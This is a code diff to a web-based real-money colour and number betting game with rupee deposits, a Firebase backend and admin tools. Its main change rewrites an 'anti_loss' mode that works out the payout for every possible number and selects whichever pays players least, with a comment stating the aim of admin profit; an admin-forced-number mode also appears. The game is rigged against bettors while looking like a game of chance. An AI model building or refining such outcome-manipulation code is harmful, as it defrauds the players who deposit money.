@@ -338,7 +338,7 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    // 🔒 Universal SHA-256 Hashing for Passwords (Works everywhere)
+    // Universal SHA-256 Hashing
     function hashText(text) {
         return CryptoJS.SHA256(text.toString().trim()).toString();
     }
@@ -479,6 +479,7 @@
         document.getElementById("payeeName").innerText = payeeName;
     }
 
+    // 🛡️ UPDATED STRICT ANTI-LOSS ROUND EVALUATION LOGIC
     function evaluateGlobalRound(roundId) {
         if (processedRounds[roundId]) return;
         processedRounds[roundId] = true;
@@ -489,11 +490,34 @@
             adminSettings.forcedNumber = null;
         } else if (adminSettings.mode === 'anti_loss') {
             let payouts = {};
+
             for (let n = 0; n < 10; n++) {
-                let colMulti = (n === 0 || n === 5) ? 1.45 : 1.9;
-                let col = (n===1||n===3||n===7||n===9) ? "Green" : ((n===2||n===4||n===6||n===8) ? "Red" : "Violet");
-                payouts[n] = (globalLiveBets.color[col] * colMulti) + (globalLiveBets.number[n] * 9.0);
+                let totalPayoutForThisNumber = 0;
+
+                // 1. Direct Number Bet Payout (9x)
+                totalPayoutForThisNumber += (globalLiveBets.number[n] || 0) * 9.0;
+
+                // 2. Color Bet Payout Calculation
+                if (n === 1 || n === 3 || n === 7 || n === 9) {
+                    // Pure Green Numbers -> Green bets get 1.9x
+                    totalPayoutForThisNumber += (globalLiveBets.color["Green"] || 0) * 1.9;
+                } else if (n === 2 || n === 4 || n === 6 || n === 8) {
+                    // Pure Red Numbers -> Red bets get 1.9x
+                    totalPayoutForThisNumber += (globalLiveBets.color["Red"] || 0) * 1.9;
+                } else if (n === 0) {
+                    // Violet + Red Half Win (1.5x)
+                    totalPayoutForThisNumber += (globalLiveBets.color["Violet"] || 0) * 1.9;
+                    totalPayoutForThisNumber += (globalLiveBets.color["Red"] || 0) * 1.5;
+                } else if (n === 5) {
+                    // Violet + Green Half Win (1.5x)
+                    totalPayoutForThisNumber += (globalLiveBets.color["Violet"] || 0) * 1.9;
+                    totalPayoutForThisNumber += (globalLiveBets.color["Green"] || 0) * 1.5;
+                }
+
+                payouts[n] = totalPayoutForThisNumber;
             }
+
+            // Find lowest total payout (Minimizes payout -> Admin Profits)
             let minPayout = Math.min(...Object.values(payouts));
             let bestNums = Object.keys(payouts).filter(k => payouts[k] === minPayout);
             winningNum = parseInt(bestNums[Math.floor(Math.random() * bestNums.length)]);
@@ -510,15 +534,17 @@
             let winnings = 0;
 
             if (activeBet.type === "number" && activeBet.choice === winningNum) {
-                win = true; winnings = activeBet.amount * 9;
+                win = true; 
+                winnings = activeBet.amount * 9;
             } else if (activeBet.type === "color") {
                 if (activeBet.choice === winningColor) {
                     win = true;
-                    let multiplier = (winningNum === 0 || winningNum === 5) ? 1.45 : 1.9;
+                    let multiplier = (winningNum === 0 || winningNum === 5) ? 1.5 : 1.9;
                     winnings = Math.round(activeBet.amount * multiplier);
                 } else if (winningColor === "Violet" && (winningNum === 0 || winningNum === 5)) {
                     if ((winningNum === 0 && activeBet.choice === "Red") || (winningNum === 5 && activeBet.choice === "Green")) {
-                        win = true; winnings = Math.round(activeBet.amount * 1.45);
+                        win = true; 
+                        winnings = Math.round(activeBet.amount * 1.5);
                     }
                 }
             }
@@ -592,7 +618,6 @@
         document.getElementById("betTotal").innerText = "💰 GRAND TOTAL BETS: ₹" + tot;
     }
 
-    // 🔒 FIXED REGISTRATION: Correct Hashing & Firebase Write
     function submitRegister() {
         let name = document.getElementById("regName").value.trim();
         let mobile = document.getElementById("regMobile").value.trim();
@@ -621,7 +646,6 @@
         });
     }
 
-    // 🔒 FIXED LOGIN: Exact Hash Match Comparison
     function submitLogin() {
         let mobile = document.getElementById("loginMobile").value.trim();
         let pwd = document.getElementById("loginPwd").value.trim();
@@ -706,7 +730,6 @@
         updateQR(100);
     }
 
-    // 🔒 SMART UTR PROTECTION: Allows Original UTR if Fake Submission is Rejected
     async function submitDeposit() {
         if (!currentUser) return alert("Please login first!");
 
@@ -826,7 +849,6 @@
         loadAdminData();
     }
 
-    // 👑 ADMIN FUNCTION TO MODIFY BALANCE MANUALLY (+ or -)
     function adminModifyBalance(mobile) {
         let amountStr = prompt(`यूज़र (+91 ${mobile}) का बैलेंस बदलने के लिए राशि दर्ज करें:\n(उदाहरण: +500 जोड़ने के लिए 500 लिखें, घटाने के लिए -200 लिखें)`);
         
@@ -958,7 +980,6 @@
         });
     }
 
-    // 🔓 ADMIN REJECT FUNCTION: Removes Fake UTR to Unblock Original Owner
     function rejectDep(id) {
         db.ref(`deposits/${id}`).once("value", (snapshot) => {
             let d = snapshot.val();
